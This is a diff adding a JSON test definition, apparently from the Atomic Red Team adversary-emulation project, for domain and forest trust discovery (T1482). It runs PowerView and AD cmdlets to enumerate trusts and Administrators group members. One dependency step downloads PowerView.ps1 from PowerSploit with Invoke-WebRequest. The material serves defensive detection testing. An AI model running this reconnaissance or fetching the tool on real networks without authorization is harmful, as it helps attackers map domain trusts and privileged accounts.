@@ -1,0 +1,131 @@
+{
+  "id": "c58fbc62-8a62-489e-8f2d-3565d7d96f30",
+  "name": "Powershell enumerate domains and forests",
+  "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bd322e37-d055-49ca-9604-ea731e21f540",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a158b3eb-5e9f-40eb-acc0-7f79656d752f",
+      "name": "Check dependency 1/2",
+      "description": "PowerView PowerShell script must exist on disk\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e1c91b37-ceee-4e8b-81d4-8f331b310648",
+      "name": "Resolve dependency 1/2",
+      "description": "PowerView PowerShell script must exist on disk\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4e497074-267f-4fed-80d4-8db92e46f3c6",
+      "name": "Re-check dependency 1/2",
+      "description": "PowerView PowerShell script must exist on disk\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "806b90a8-1636-49d5-b2c0-ab0617b02ade",
+      "name": "Check dependency 2/2",
+      "description": "RSAT PowerShell AD admin cmdlets must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "35d829fe-92e4-4cb9-a435-bb5afbfb9b48",
+      "name": "Resolve dependency 2/2",
+      "description": "RSAT PowerShell AD admin cmdlets must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"Sorry RSAT must be installed manually\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "543600f8-a83d-4a7f-964a-8812d11c786e",
+      "name": "Re-check dependency 2/2",
+      "description": "RSAT PowerShell AD admin cmdlets must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a158b3eb-5e9f-40eb-acc0-7f79656d752f",
+      "p": "on-success",
+      "o": "bd322e37-d055-49ca-9604-ea731e21f540"
+    },
+    {
+      "s": "a158b3eb-5e9f-40eb-acc0-7f79656d752f",
+      "p": "on-failure",
+      "o": "e1c91b37-ceee-4e8b-81d4-8f331b310648"
+    },
+    {
+      "s": "e1c91b37-ceee-4e8b-81d4-8f331b310648",
+      "p": "on-success",
+      "o": "4e497074-267f-4fed-80d4-8db92e46f3c6"
+    },
+    {
+      "s": "4e497074-267f-4fed-80d4-8db92e46f3c6",
+      "p": "on-failure",
+      "o": "bd322e37-d055-49ca-9604-ea731e21f540"
+    },
+    {
+      "s": "806b90a8-1636-49d5-b2c0-ab0617b02ade",
+      "p": "on-success",
+      "o": "bd322e37-d055-49ca-9604-ea731e21f540"
+    },
+    {
+      "s": "806b90a8-1636-49d5-b2c0-ab0617b02ade",
+      "p": "on-failure",
+      "o": "35d829fe-92e4-4cb9-a435-bb5afbfb9b48"
+    },
+    {
+      "s": "35d829fe-92e4-4cb9-a435-bb5afbfb9b48",
+      "p": "on-success",
+      "o": "543600f8-a83d-4a7f-964a-8812d11c786e"
+    },
+    {
+      "s": "543600f8-a83d-4a7f-964a-8812d11c786e",
+      "p": "on-failure",
+      "o": "bd322e37-d055-49ca-9604-ea731e21f540"
+    }
+  ],
+  "tags": [
+    "T1482",
+    "atomic-red-team"
+  ]
+}
